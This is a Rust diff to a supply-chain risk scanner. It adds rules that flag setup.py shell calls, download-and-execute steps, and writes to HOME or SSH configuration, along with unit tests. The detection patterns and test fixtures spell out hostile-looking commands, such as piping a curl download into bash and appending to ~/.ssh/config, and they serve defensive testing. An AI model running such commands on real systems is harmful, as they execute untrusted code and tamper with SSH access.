@@ -75,6 +75,7 @@ struct AstLocationRow {
 
 struct RowRiskContext {
     package_json: bool,
+    python_setup: bool,
     build_script: bool,
     github_workflow: bool,
     workflow_has_secret: bool,
@@ -84,6 +85,7 @@ impl RowRiskContext {
     fn new(row: &AstRow) -> Self {
         Self {
             package_json: is_package_json_path(&row.path),
+            python_setup: is_python_setup_path(&row.path),
             build_script: is_build_script_path(&row.path),
             github_workflow: is_github_workflow_path(&row.path),
             workflow_has_secret: row
@@ -471,6 +473,21 @@ fn push_supply_chain_risks(
         );
     }
 
+    if ctx.python_setup && looks_like_python_setup_command(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::High,
+                path: path.to_string(),
+                line,
+                rule: "python-setup-command".to_string(),
+                title: "Python setup script invokes a command boundary".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
     if looks_like_download_execute(text) {
         push_unique(
             out,
@@ -481,6 +498,21 @@ fn push_supply_chain_risks(
                 line,
                 rule: "download-execute".to_string(),
                 title: "Downloaded content is executed or made executable".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if looks_like_home_or_ssh_write(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::High,
+                path: path.to_string(),
+                line,
+                rule: "install-home-write".to_string(),
+                title: "Install path writes to HOME or SSH configuration".to_string(),
                 evidence: sanitize_evidence(text),
             },
         );
@@ -558,6 +590,10 @@ fn is_package_json_path(path: &str) -> bool {
     normalized_path(path).ends_with("/package.json") || normalized_path(path) == "package.json"
 }
 
+fn is_python_setup_path(path: &str) -> bool {
+    normalized_path(path).ends_with("/setup.py") || normalized_path(path) == "setup.py"
+}
+
 fn is_build_script_path(path: &str) -> bool {
     normalized_path(path).ends_with("/build.rs") || normalized_path(path) == "build.rs"
 }
@@ -593,6 +629,14 @@ fn looks_like_subprocess_or_shell(text: &str) -> bool {
         || lower.contains("cmd")
 }
 
+fn looks_like_python_setup_command(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("os.system")
+        || lower.contains("os.popen")
+        || lower.contains("subprocess.")
+        || lower.contains("subprocess::")
+}
+
 fn looks_like_download_execute(text: &str) -> bool {
     let lower = text.to_ascii_lowercase();
     let downloads = lower.contains("curl") || lower.contains("wget");
@@ -606,6 +650,22 @@ fn looks_like_download_execute(text: &str) -> bool {
             || lower.contains("chmod +x")
             || lower.contains("&& ./")
             || lower.contains("; ./"))
+}
+
+fn looks_like_home_or_ssh_write(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    let home_or_ssh = lower.contains("~/.ssh")
+        || lower.contains("$home/.ssh")
+        || lower.contains("${home}/.ssh")
+        || lower.contains("/.ssh/config")
+        || lower.contains("/.ssh/authorized_keys");
+    let write_op = lower.contains(">>")
+        || lower.contains("> ")
+        || lower.contains("tee ")
+        || lower.contains("cat >")
+        || lower.contains("install ")
+        || lower.contains("chmod ");
+    home_or_ssh && write_op
 }
 
 fn looks_like_base64_execute(text: &str) -> bool {
@@ -789,6 +849,16 @@ mod tests {
     }
 
     #[test]
+    fn flags_python_setup_command() {
+        let seed = r#"{"path":"setup.py","locations":[{"kind":"call","line":5,"text":"subprocess.check_call"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "python-setup-command" && f.severity == Severity::High && f.line == Some(5)
+        }));
+    }
+
+    #[test]
     fn flags_dockerfile_download_execute() {
         let seed = r#"{"path":"Dockerfile","locations":[{"kind":"call","line":3,"text":"RUN curl https://example.invalid/install.sh | bash"}]}"#;
         let findings = findings_from_seed(seed);
@@ -836,6 +906,16 @@ mod tests {
 
         assert!(findings.iter().any(|f| {
             f.rule == "base64-execute" && f.severity == Severity::High && f.line == Some(2)
+        }));
+    }
+
+    #[test]
+    fn flags_install_home_write() {
+        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":3,"text":"echo Host example.invalid >> ~/.ssh/config"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "install-home-write" && f.severity == Severity::High && f.line == Some(3)
         }));
     }
 
